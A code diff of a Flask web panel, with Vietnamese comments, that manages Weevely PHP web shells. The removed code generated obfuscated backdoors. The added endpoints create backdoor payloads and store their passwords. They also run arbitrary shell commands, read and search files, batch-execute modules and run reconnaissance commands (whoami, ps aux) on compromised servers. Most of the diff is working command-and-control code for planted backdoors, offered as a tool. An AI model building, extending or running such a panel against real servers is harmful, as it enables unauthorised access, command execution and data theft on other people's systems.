@@ -657,13 +657,17 @@ def download_file():
 
 
 
+# ==========================================
+# ADVANCED WEEVELY PAYLOAD & MODULE APIs
+# ==========================================
+from apps.weevely.module_executor import WeevelyModuleExecutor, WeevelyPayloadGenerator
+from apps.models import ShellConnection, ShellType, ShellStatus
 
 
-
-
-
-
-# weevely   
+# Initialize components
+executor = WeevelyModuleExecutor()
+payload_generator = WeevelyPayloadGenerator()
+  
 @blueprint.route('/weevely', methods=['GET'])
 def weevely():
     """Main weevely management page"""
@@ -695,6 +699,69 @@ def get_weevely_connections():
     except Exception as e:
         print(f"Error in get_weevely_connections: {str(e)}")
         return jsonify({'error': 'Server error', 'details': str(e)}), 500
+
+# ==========================================
+# PAYLOAD GENERATION => Tạo payload và lưu vào CSDL ĐÃ THÀNH CÔNGGGGGGG
+# ==========================================
+@blueprint.route('/api/weevely/create-weevely-payload', methods=['POST'])
+def create_weevely_payload():
+    """Tạo weevely payload"""
+    try:
+        data = request.get_json()
+        if not data:
+            return jsonify({'status': 'error', 'message': 'No data provided'}), 400
+        
+        filename = data.get('filename') + '.php'
+        password = data.get('password')
+        #print(f"[+] Create Weevely Payload Data: {filename} & {password}")
+
+        if not filename or not password:
+            return jsonify({'status': 'error', 'message': 'Filename and password required'}), 400
+        
+        result = payload_generator.create(filename, password)
+        if result['success']:
+            '''Nếu tạo được payloadf rồi thì ta sẽ nó vào CSDL'''
+
+            local_path_db = os.path.join('..', 'dataserver', 'uploads', filename) # Đường dẫn để lưu vào DB
+            file_size = os.path.getsize(os.path.join(get_folder_file_upload(), filename))  # Lấy size theo bytes
+            file_size_kb = file_size / 1024  # Chuyển sang KB
+            
+            # Tính hash SHA256
+            sha256_hash = hashlib.sha256()
+            with open(os.path.join(get_folder_file_upload(), filename), "rb") as f:
+                for chunk in iter(lambda: f.read(4096), b""):
+                    sha256_hash.update(chunk)
+            file_hash = sha256_hash.hexdigest()
+            # Tạo connection mới
+            datafile = DataFile(                
+                file_name=filename,
+                source_path= '',
+                local_path= local_path_db,
+                file_type='upload',
+                file_size=file_size_kb,
+                file_hash=file_hash,
+                connection_id='',
+                file_created_at=datetime.now(),
+                file_updated_at=datetime.now(),
+                password=password
+            )
+            
+            db.session.add(datafile)
+            db.session.commit()
+            
+            return jsonify({
+                'status': '1',
+                'data': result
+            })
+        else:
+            return jsonify({
+                'status': '-1',
+                'data': result
+            })
+        
+    except Exception as e:
+        print(f"[##] Error in create_weevely_payload: {str(e)}")
+        return jsonify({'message': str(e)}), 500
 
 @blueprint.route('/api/add_weevely', methods=['POST'])
 def add_weevely():
@@ -786,232 +853,315 @@ def extract_password_from_notes(notes):
             return line.replace('Weevely Password: ', '').strip()
     return None
 
-@blueprint.route('/api/weevely/<weevely_id>/generate', methods=['POST'])
-def generate_weevely_backdoor(weevely_id):
-    """Generate weevely backdoor file"""
-    try:
-        shell_conn = ShellConnection.get_by_id(weevely_id)
-        if not shell_conn or shell_conn.shell_type != ShellType.WEBSHELL:
-            return jsonify({'status': 'error', 'message': 'Weevely connection not found'}), 404
-        
-        # Extract password from notes
-        password = extract_password_from_notes(shell_conn.notes)
-        if not password:
-            return jsonify({'status': 'error', 'message': 'Weevely password not found in connection notes'}), 400
-        
-        # Path to weevely.py
-        weevely_path = os.path.join(current_app.root_path, 'apps', 'weevely', 'weevely3', 'weevely.py')
-        if not os.path.exists(weevely_path):
-            return jsonify({'status': 'error', 'message': 'Weevely binary not found'}), 500
-        
-        # Generate backdoor file path
-        backdoor_dir = os.path.join(current_app.root_path, '..', 'downloads', 'weevely_backdoors')
-        os.makedirs(backdoor_dir, exist_ok=True)
-        backdoor_filename = f'weevely_{weevely_id[:8]}.php'
-        backdoor_path = os.path.join(backdoor_dir, backdoor_filename)
-        
-        # Generate command - use default obfuscation
-        cmd = [
-            'python3', weevely_path, 'generate',
-            password,
-            backdoor_path,
-            '-obfuscator', 'phar',
-            '-agent', 'obfpost_php'
-        ]
-        
-        print(f"Generating weevely backdoor: {' '.join(cmd)}")
-        
-        # Execute generation
-        result = subprocess.run(cmd, capture_output=True, text=True, cwd=os.path.dirname(weevely_path))
-        
-        if result.returncode == 0:
-            # Update connection status to indicate backdoor is ready
-            file_size = os.path.getsize(backdoor_path) if os.path.exists(backdoor_path) else 0
-            shell_conn.update_status(
-                ShellStatus.DISCONNECTED,  # Ready to connect but not connected yet
-                notes=shell_conn.notes + f"\nBackdoor file: {backdoor_filename} ({file_size} bytes)"
-            )
-            
-            return jsonify({
-                'status': 'success',
-                'message': 'Weevely backdoor generated successfully',
-                'backdoor_path': backdoor_path,
-                'backdoor_size': file_size,
-                'stdout': result.stdout
-            })
-        else:
-            return jsonify({
-                'status': 'error',
-                'message': 'Failed to generate weevely backdoor',
-                'stderr': result.stderr,
-                'stdout': result.stdout
-            }), 500
-            
-    except Exception as e:
-        print(f"Error in generate_weevely_backdoor: {str(e)}")
-        return jsonify({'status': 'error', 'message': 'Server error', 'details': str(e)}), 500
 
-@blueprint.route('/api/weevely/<weevely_id>/connect', methods=['POST'])
-def connect_weevely(weevely_id):
-    """Connect to weevely backdoor"""
-    try:
-        shell_conn = ShellConnection.get_by_id(weevely_id)
-        if not shell_conn or shell_conn.shell_type != ShellType.WEBSHELL:
-            return jsonify({'status': 'error', 'message': 'Weevely connection not found'}), 404
-        
-        # Extract password from notes
-        password = extract_password_from_notes(shell_conn.notes)
-        if not password:
-            return jsonify({'status': 'error', 'message': 'Weevely password not found in connection notes'}), 400
-        
-        # Path to weevely.py
-        weevely_path = os.path.join(current_app.root_path, 'apps', 'weevely', 'weevely3', 'weevely.py')
-        if not os.path.exists(weevely_path):
-            return jsonify({'status': 'error', 'message': 'Weevely binary not found'}), 500
-        
-        # Test connection with simple command
-        cmd = [
-            'python3', weevely_path, 'terminal',
-            shell_conn.url,
-            password,
-            'system_info'  # Simple command to test connection
-        ]
-        
-        print(f"Testing weevely connection: {' '.join(cmd[:4])} [password] system_info")
-        
-        # Execute connection test
-        result = subprocess.run(cmd, capture_output=True, text=True, timeout=30, cwd=os.path.dirname(weevely_path))
-        
-        if result.returncode == 0 and ('PHP' in result.stdout or 'Linux' in result.stdout or 'Windows' in result.stdout):
-            # Connection successful, update status
-            shell_conn.update_status(
-                ShellStatus.CONNECTED,
-                os_info=result.stdout.strip()[:200]  # Limit length
-            )
-            
-            # Save command record
-            ShellCommand.create_command(
-                connection_id=weevely_id,
-                command='system_info',
-                output=result.stdout,
-                success=True
-            )
-            
-            return jsonify({
-                'status': 'success',
-                'message': 'Connected to weevely backdoor successfully',
-                'system_info': result.stdout.strip()
-            })
-        else:
-            shell_conn.update_status(ShellStatus.ERROR)
-            return jsonify({
-                'status': 'error',
-                'message': 'Failed to connect to weevely backdoor',
-                'stderr': result.stderr,
-                'stdout': result.stdout
-            }), 500
-            
-    except subprocess.TimeoutExpired:
-        return jsonify({'status': 'error', 'message': 'Connection timeout'}), 500
-    except Exception as e:
-        print(f"Error in connect_weevely: {str(e)}")
-        return jsonify({'status': 'error', 'message': 'Server error', 'details': str(e)}), 500
 
-@blueprint.route('/api/weevely/<weevely_id>/command', methods=['POST'])
-def execute_weevely_command(weevely_id):
-    """Execute command on weevely backdoor"""
+def extract_password_from_notes(notes):
+    """Extract password from notes field"""
+    if not notes:
+        return None
+    # Simple extraction - you can improve this
+    lines = notes.split('\n')
+    for line in lines:
+        if 'password:' in line.lower():
+            return line.split(':', 1)[1].strip()
+    return None
+
+
+
+# ==========================================
+# CONNECTION & SESSION
+# ==========================================
+
+@blueprint.route('/<weevely_id>/test', methods=['POST'])
+def test_connection(weevely_id):
+    """Test kết nối weevely"""
     try:
-        data = request.get_json()
-        if not data or not data.get('command'):
-            return jsonify({'status': 'error', 'message': 'Command is required'}), 400
-        
         shell_conn = ShellConnection.get_by_id(weevely_id)
         if not shell_conn or shell_conn.shell_type != ShellType.WEBSHELL:
-            return jsonify({'status': 'error', 'message': 'Weevely connection not found'}), 404
+            return jsonify({'status': 'error', 'message': 'Weevely not found'}), 404
         
-        # Extract password from notes
         password = extract_password_from_notes(shell_conn.notes)
         if not password:
-            return jsonify({'status': 'error', 'message': 'Weevely password not found in connection notes'}), 400
+            return jsonify({'status': 'error', 'message': 'Password not found'}), 400
         
-        command = data['command']
+        result = executor.test_connection(shell_conn.url, password)
         
-        # Path to weevely.py
-        weevely_path = os.path.join(current_app.root_path, 'apps', 'weevely', 'weevely3', 'weevely.py')
-        if not os.path.exists(weevely_path):
-            return jsonify({'status': 'error', 'message': 'Weevely binary not found'}), 500
-        
-        # Execute command
-        cmd = [
-            'python3', weevely_path, 'terminal',
-            shell_conn.url,
-            password,
-            command
-        ]
-        
-        print(f"Executing weevely command: {command}")
-        
-        # Create command record
-        shell_cmd = ShellCommand.create_command(
-            connection_id=weevely_id,
-            command=command
-        )
-        
-        # Execute
-        result = subprocess.run(cmd, capture_output=True, text=True, timeout=60, cwd=os.path.dirname(weevely_path))
-        
-        # Complete command record
-        shell_cmd.complete(
-            output=result.stdout,
-            success=result.returncode == 0,
-            error_message=result.stderr if result.returncode != 0 else None
-        )
-        
-        # Update connection stats
-        shell_conn.increment_command_count()
-        
-        if result.returncode == 0:
+        if result['success']:
             shell_conn.update_status(ShellStatus.CONNECTED)
-            return jsonify({
-                'status': 'success',
-                'output': result.stdout,
-                'command_id': shell_cmd.command_id
-            })
-        else:
-            return jsonify({
-                'status': 'error',
-                'message': 'Command execution failed',
-                'output': result.stdout,
-                'error': result.stderr,
-                'command_id': shell_cmd.command_id
-            }), 500
-            
-    except subprocess.TimeoutExpired:
-        shell_cmd.complete(success=False, error_message='Command timeout')
-        return jsonify({'status': 'error', 'message': 'Command execution timeout'}), 500
-    except Exception as e:
-        print(f"Error in execute_weevely_command: {str(e)}")
-        return jsonify({'status': 'error', 'message': 'Server error', 'details': str(e)}), 500
-
-@blueprint.route('/api/weevely/<weevely_id>/commands', methods=['GET'])
-def get_weevely_commands(weevely_id):
-    """Get command history for weevely connection"""
-    try:
-        limit = request.args.get('limit', 50, type=int)
-        
-        shell_conn = ShellConnection.get_by_id(weevely_id)
-        if not shell_conn or shell_conn.shell_type != ShellType.WEBSHELL:
-            return jsonify({'status': 'error', 'message': 'Weevely connection not found'}), 404
-        
-        commands = ShellCommand.get_by_connection(weevely_id, limit)
         
         return jsonify({
-            'status': 'success',
-            'commands': [cmd.to_dict() for cmd in commands],
-            'total_commands': shell_conn.command_count
+            'status': 'success' if result['success'] else 'error',
+            'data': result
         })
         
     except Exception as e:
-        print(f"Error in get_weevely_commands: {str(e)}")
-        return jsonify({'status': 'error', 'message': 'Server error', 'details': str(e)}), 500
+        return jsonify({'status': 'error', 'message': str(e)}), 500
 
+@blueprint.route('/<weevely_id>/session/info', methods=['GET'])
+def get_session_info(weevely_id):
+    """Lấy thông tin session"""
+    try:
+        shell_conn = ShellConnection.get_by_id(weevely_id)
+        if not shell_conn:
+            return jsonify({'status': 'error', 'message': 'Weevely not found'}), 404
+        
+        password = extract_password_from_notes(shell_conn.notes)
+        if not password:
+            return jsonify({'status': 'error', 'message': 'Password not found'}), 400
+        
+        result = executor.get_session_info(shell_conn.url, password)
+        
+        return jsonify({
+            'status': 'success' if result else 'error',
+            'data': result
+        })
+        
+    except Exception as e:
+        return jsonify({'status': 'error', 'message': str(e)}), 500
+
+# ==========================================
+# MODULE EXECUTION
+# ==========================================
+
+@blueprint.route('/<weevely_id>/execute', methods=['POST'])
+def execute_module(weevely_id):
+    """Thực thi module command"""
+    try:
+        data = request.get_json()
+        if not data:
+            return jsonify({'status': 'error', 'message': 'No data provided'}), 400
+        
+        shell_conn = ShellConnection.get_by_id(weevely_id)
+        if not shell_conn:
+            return jsonify({'status': 'error', 'message': 'Weevely not found'}), 404
+        
+        password = extract_password_from_notes(shell_conn.notes)
+        if not password:
+            return jsonify({'status': 'error', 'message': 'Password not found'}), 400
+        
+        command = data.get('command')
+        timeout = data.get('timeout', 60)
+        retries = data.get('retries', 1)
+        
+        if not command:
+            return jsonify({'status': 'error', 'message': 'Command required'}), 400
+        
+        result = executor.execute_module(shell_conn.url, password, command, timeout, retries)
+        
+        return jsonify({
+            'status': 'success' if result['success'] else 'error',
+            'data': result
+        })
+        
+    except Exception as e:
+        return jsonify({'status': 'error', 'message': str(e)}), 500
+
+@blueprint.route('/<weevely_id>/batch', methods=['POST'])
+def batch_execute(weevely_id):
+    """Thực thi nhiều command"""
+    try:
+        data = request.get_json()
+        if not data:
+            return jsonify({'status': 'error', 'message': 'No data provided'}), 400
+        
+        shell_conn = ShellConnection.get_by_id(weevely_id)
+        if not shell_conn:
+            return jsonify({'status': 'error', 'message': 'Weevely not found'}), 404
+        
+        password = extract_password_from_notes(shell_conn.notes)
+        if not password:
+            return jsonify({'status': 'error', 'message': 'Password not found'}), 400
+        
+        commands = data.get('commands', [])
+        delay = data.get('delay', 0.5)
+        
+        if not commands:
+            return jsonify({'status': 'error', 'message': 'Commands required'}), 400
+        
+        result = executor.batch_execute(shell_conn.url, password, commands, delay)
+        
+        return jsonify({
+            'status': 'success',
+            'data': result
+        })
+        
+    except Exception as e:
+        return jsonify({'status': 'error', 'message': str(e)}), 500
+
+# ==========================================
+# FILE OPERATIONS
+# ==========================================
+
+@blueprint.route('/<weevely_id>/file/find', methods=['POST'])
+def file_find(weevely_id):
+    """Tìm kiếm files"""
+    try:
+        data = request.get_json()
+        if not data:
+            return jsonify({'status': 'error', 'message': 'No data provided'}), 400
+        
+        shell_conn = ShellConnection.get_by_id(weevely_id)
+        if not shell_conn:
+            return jsonify({'status': 'error', 'message': 'Weevely not found'}), 404
+        
+        password = extract_password_from_notes(shell_conn.notes)
+        if not password:
+            return jsonify({'status': 'error', 'message': 'Password not found'}), 400
+        
+        search_path = data.get('path', '/')
+        pattern = data.get('pattern', '')
+        file_type = data.get('file_type', 'f')
+        vector = data.get('vector', 'sh_find')
+        
+        result = executor.file_find(shell_conn.url, password, search_path, pattern, file_type, vector)
+        
+        return jsonify({
+            'status': 'success' if result['success'] else 'error',
+            'data': result
+        })
+        
+    except Exception as e:
+        return jsonify({'status': 'error', 'message': str(e)}), 500
+
+@blueprint.route('/<weevely_id>/file/read', methods=['POST'])
+def file_read(weevely_id):
+    """Đọc file"""
+    try:
+        data = request.get_json()
+        if not data:
+            return jsonify({'status': 'error', 'message': 'No data provided'}), 400
+        
+        shell_conn = ShellConnection.get_by_id(weevely_id)
+        if not shell_conn:
+            return jsonify({'status': 'error', 'message': 'Weevely not found'}), 404
+        
+        password = extract_password_from_notes(shell_conn.notes)
+        if not password:
+            return jsonify({'status': 'error', 'message': 'Password not found'}), 400
+        
+        file_path = data.get('file_path')
+        vector = data.get('vector', 'file_get_contents')
+        encoding = data.get('encoding', 'utf-8')
+        
+        if not file_path:
+            return jsonify({'status': 'error', 'message': 'File path required'}), 400
+        
+        result = executor.file_read(shell_conn.url, password, file_path, vector, encoding)
+        
+        return jsonify({
+            'status': 'success' if result['success'] else 'error',
+            'data': result
+        })
+        
+    except Exception as e:
+        return jsonify({'status': 'error', 'message': str(e)}), 500
+
+# ==========================================
+# SYSTEM OPERATIONS
+# ==========================================
+
+@blueprint.route('/<weevely_id>/system/info', methods=['GET'])
+def system_info(weevely_id):
+    """Lấy system info"""
+    try:
+        shell_conn = ShellConnection.get_by_id(weevely_id)
+        if not shell_conn:
+            return jsonify({'status': 'error', 'message': 'Weevely not found'}), 404
+        
+        password = extract_password_from_notes(shell_conn.notes)
+        if not password:
+            return jsonify({'status': 'error', 'message': 'Password not found'}), 400
+        
+        result = executor.execute_module(shell_conn.url, password, ':system_info')
+        
+        return jsonify({
+            'status': 'success' if result['success'] else 'error',
+            'data': result
+        })
+        
+    except Exception as e:
+        return jsonify({'status': 'error', 'message': str(e)}), 500
+
+@blueprint.route('/<weevely_id>/shell', methods=['POST'])
+def shell_execute(weevely_id):
+    """Thực thi shell command"""
+    try:
+        data = request.get_json()
+        if not data:
+            return jsonify({'status': 'error', 'message': 'No data provided'}), 400
+        
+        shell_conn = ShellConnection.get_by_id(weevely_id)
+        if not shell_conn:
+            return jsonify({'status': 'error', 'message': 'Weevely not found'}), 404
+        
+        password = extract_password_from_notes(shell_conn.notes)
+        if not password:
+            return jsonify({'status': 'error', 'message': 'Password not found'}), 400
+        
+        command = data.get('command')
+        if not command:
+            return jsonify({'status': 'error', 'message': 'Command required'}), 400
+        
+        shell_cmd = f':shell_sh {command}'
+        result = executor.execute_module(shell_conn.url, password, shell_cmd)
+        
+        return jsonify({
+            'status': 'success' if result['success'] else 'error',
+            'data': result
+        })
+        
+    except Exception as e:
+        return jsonify({'status': 'error', 'message': str(e)}), 500
+
+# ==========================================
+# UTILITY
+# ==========================================
+
+@blueprint.route('/modules', methods=['GET'])
+def get_available_modules():
+    """Lấy danh sách modules"""
+    try:
+        modules = executor.COMMON_MODULES
+        vectors = executor.FILE_VECTORS
+        
+        return jsonify({
+            'status': 'success',
+            'data': {
+                'modules': modules,
+                'vectors': vectors
+            }
+        })
+        
+    except Exception as e:
+        return jsonify({'status': 'error', 'message': str(e)}), 500
+
+@blueprint.route('/<weevely_id>/quick-scan', methods=['POST'])
+def quick_scan(weevely_id):
+    """Quick scan with common commands"""
+    try:
+        shell_conn = ShellConnection.get_by_id(weevely_id)
+        if not shell_conn:
+            return jsonify({'status': 'error', 'message': 'Weevely not found'}), 404
+        
+        password = extract_password_from_notes(shell_conn.notes)
+        if not password:
+            return jsonify({'status': 'error', 'message': 'Password not found'}), 400
+        
+        # Quick scan commands
+        commands = [
+            ':system_info',
+            ':shell_sh whoami',
+            ':shell_sh pwd',
+            ':file_ls /',
+            ':shell_sh ps aux | head -10'
+        ]
+        
+        result = executor.batch_execute(shell_conn.url, password, commands, delay=0.3)
+        
+        return jsonify({
+            'status': 'success',
+            'data': result
+        })
+        
+    except Exception as e:
+        return jsonify({'status': 'error', 'message': str(e)}), 500
